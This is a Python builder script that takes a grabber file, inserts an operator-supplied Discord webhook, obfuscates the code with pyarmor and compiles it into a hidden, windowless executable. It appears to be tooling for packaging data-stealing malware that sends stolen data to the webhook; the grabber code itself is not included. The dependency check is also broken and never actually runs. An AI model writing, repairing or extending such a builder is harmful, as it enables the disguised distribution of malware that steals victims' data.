import subprocess
import os

user = str(os.environ["USERNAME"])

def compile(code, name):
    print("Creating main script...")
    f = open("main.py", "w")
    f.write(code)
    f.close()
    print("Protecting code using pyarmor...")
    subprocess.run("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyarmor.exe obfuscate main.py", shell=True)
    print("Compiling code...")
    subprocess.run("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyinstaller.exe dist\\main.py --onefile --noconsole --name " + name, shell=True)
    print("Compile complete!")
    os.remove("dist\\main.py")
    os.remove("dist\\build.py")

def check_for_depencies():
    if not os.path.isfile("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyarmor.exe") or os.path.isfile("C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python\\Python39\\Scripts\\pyinstaller.exe") :
        return False
    else:
        return True

def main():
    if check_for_depencies:
        print("Dependencies ok, firing up")
    else:
        print("Coudn't find dependencies, exiting")
    name = input(str("Enter name for executable: "))
    webhook = input(str("Enter Discord webhook: "))
    with open("src\\grab.py", "r") as file:
        filedata = file.read()
    code = filedata.replace("webhook123", webhook)
    compile(code, name)

main()
